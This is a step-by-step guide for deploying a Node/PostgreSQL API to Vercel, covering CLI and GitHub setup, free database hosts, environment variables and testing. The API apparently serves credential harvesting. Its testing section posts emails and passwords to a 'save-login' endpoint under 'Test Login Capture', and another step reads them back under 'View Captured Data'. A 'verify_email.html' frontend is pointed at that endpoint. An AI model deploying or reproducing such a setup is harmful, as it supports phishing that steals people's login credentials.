# Complete Vercel Deployment Guide

## 🚀 Quick Start (5 Minutes)

### Step 1: Install Vercel CLI
```bash
npm install -g vercel
```

### Step 2: Login to Vercel
```bash
vercel login
```
Choose your preferred login method (GitHub, GitLab, Bitbucket, or Email)

### Step 3: Deploy
Navigate to your project folder and run:
```bash
cd c:\Users\A\Documents\html\database
vercel
```

Follow the prompts:
- **Set up and deploy?** → Yes
- **Which scope?** → Your username/team
- **Link to existing project?** → No
- **Project name?** → Press Enter (uses folder name) or type custom name
- **Directory?** → Press Enter (current directory)
- **Override settings?** → No

### Step 4: Set Environment Variables
After deployment, go to your Vercel dashboard and add:
- `DATABASE_URL` = Your PostgreSQL connection string

### Step 5: Initialize Database
Visit: `https://your-project-name.vercel.app/api/init-db`

✅ **Done! Your API is live.**

---

## 📋 Detailed Step-by-Step Guide

### Prerequisites
- Node.js installed
- A Vercel account (free at vercel.com)
- A PostgreSQL database (see database setup below)

### Method 1: CLI Deployment (Recommended)

#### 1. Install Vercel CLI
```bash
# Install globally
npm install -g vercel

# Verify installation
vercel --version
```

#### 2. Login to Vercel
```bash
vercel login
```
**Options:**
- GitHub (recommended for auto-deployments)
- GitLab
- Bitbucket  
- Email

#### 3. Navigate to Project
```bash
cd c:\Users\A\Documents\html\database
```

#### 4. Deploy Project
```bash
vercel
```

**Deployment Prompts:**
```
? Set up and deploy "database"? [Y/n] y
? Which scope do you want to deploy to? [Your Username]
? Link to existing project? [y/N] n
? What's your project's name? database
? In which directory is your code located? ./
? Want to override the settings? [y/N] n
```

#### 5. Set Environment Variables
```bash
# Set DATABASE_URL
vercel env add DATABASE_URL

# When prompted, paste your database URL:
# postgresql://user:pass@host:port/database

# Set environment (production)
vercel env add NODE_ENV
# Enter: production
```

#### 6. Redeploy with Environment Variables
```bash
vercel --prod
```

### Method 2: GitHub Integration (Auto-Deploy)

#### 1. Push to GitHub
```bash
# Initialize git (if not already)
git init
git add .
git commit -m "Initial commit"

# Create GitHub repo and push
git remote add origin https://github.com/yourusername/your-repo.git
git push -u origin main
```

#### 2. Import to Vercel
1. Go to [vercel.com](https://vercel.com)
2. Click **"New Project"**
3. Import your GitHub repository
4. Click **"Deploy"**

#### 3. Configure Environment Variables
1. Go to **Project Settings** → **Environment Variables**
2. Add variables:
   - `DATABASE_URL` → Your PostgreSQL URL
   - `NODE_ENV` → `production`
   - `BCRYPT_ROUNDS` → `10`

---

## 🗄️ Database Setup

### Option 1: Neon (Recommended - Free 512MB)

1. Go to [neon.tech](https://neon.tech)
2. Sign up with GitHub
3. Create new project
4. Copy connection string:
   ```
   postgresql://user:pass@ep-xxx.us-east-1.aws.neon.tech/dbname?sslmode=require
   ```

### Option 2: Supabase (Free 500MB)

1. Go to [supabase.com](https://supabase.com)
2. Create new project
3. Go to **Settings** → **Database**
4. Copy connection string:
   ```
   postgresql://postgres:pass@db.xxx.supabase.co:5432/postgres
   ```

### Option 3: ElephantSQL (Free 20MB)

1. Go to [elephantsql.com](https://elephantsql.com)
2. Create free account
3. Create new instance
4. Copy URL:
   ```
   postgres://user:pass@raja.db.elephantsql.com/database
   ```

---

## ⚙️ Environment Variables Setup

### Via Vercel CLI
```bash
# Add DATABASE_URL
vercel env add DATABASE_URL
# Paste your PostgreSQL connection string

# Add other variables
vercel env add NODE_ENV
# Enter: production

vercel env add BCRYPT_ROUNDS  
# Enter: 10
```

### Via Vercel Dashboard
1. Go to your project dashboard
2. Click **Settings** → **Environment Variables**
3. Add each variable:

| Name | Value | Environment |
|------|-------|-------------|
| `DATABASE_URL` | `postgresql://...` | Production |
| `NODE_ENV` | `production` | Production |
| `BCRYPT_ROUNDS` | `10` | Production |

---

## 🧪 Testing Your Deployment

### 1. Health Check
```bash
curl https://your-project.vercel.app/api/health
```

### 2. Initialize Database
```bash
curl https://your-project.vercel.app/api/init-db
```

### 3. Test Login Capture
```bash
curl -X POST https://your-project.vercel.app/api/save-login \
  -H "Content-Type: application/json" \
  -d '{"emailOrUsername":"test@example.com","password":"password123"}'
```

### 4. View Captured Data
```bash
curl https://your-project.vercel.app/api/login-attempts
```

---

## 🔧 Common Issues & Solutions

### Issue: "Module not found"
**Solution:** Ensure all dependencies are in package.json
```bash
npm install bcrypt cors dotenv express pg
```

### Issue: "Database connection failed"
**Solutions:**
- Check DATABASE_URL format
- Ensure SSL is enabled: `?sslmode=require`
- Verify database is accessible from internet

### Issue: "Function timeout"
**Solution:** Optimize database queries or upgrade Vercel plan

### Issue: "CORS errors"
**Solution:** Check CORS configuration in your functions

---

## 📱 Update Frontend URLs

After deployment, update your HTML files to use the new API URL:

```javascript
// In verify_email.html or other frontend files
// Change from:
fetch('http://localhost:3001/api/save-login', {

// To:
fetch('https://your-project.vercel.app/api/save-login', {
```

---

## 🔄 Continuous Deployment

### Auto-Deploy on Git Push
If using GitHub integration:
1. Push changes to main branch
2. Vercel automatically deploys
3. Check deployment status in dashboard

### Manual Redeploy
```bash
vercel --prod
```

---

## 📊 Monitoring & Logs

### View Logs
```bash
vercel logs https://your-project.vercel.app
```

### Dashboard Monitoring
- Go to Vercel dashboard
- Click your project
- View **Functions** tab for performance
- Check **Deployments** for history

---

## 🎯 Production Checklist

- [ ] Database created and accessible
- [ ] Environment variables set
- [ ] Database tables initialized (`/api/init-db`)
- [ ] All endpoints tested
- [ ] Frontend URLs updated
- [ ] Custom domain configured (optional)
- [ ] Monitoring set up

---

## 🌐 Custom Domain (Optional)

1. Go to **Project Settings** → **Domains**
2. Add your domain
3. Configure DNS records as shown
4. Wait for SSL certificate

---

## 💡 Pro Tips

- Use `vercel dev` for local testing
- Check function logs in Vercel dashboard
- Set up GitHub integration for auto-deploys
- Use environment variables for all secrets
- Monitor function execution time (10s limit)

**Your API will be live at:** `https://your-project-name.vercel.app`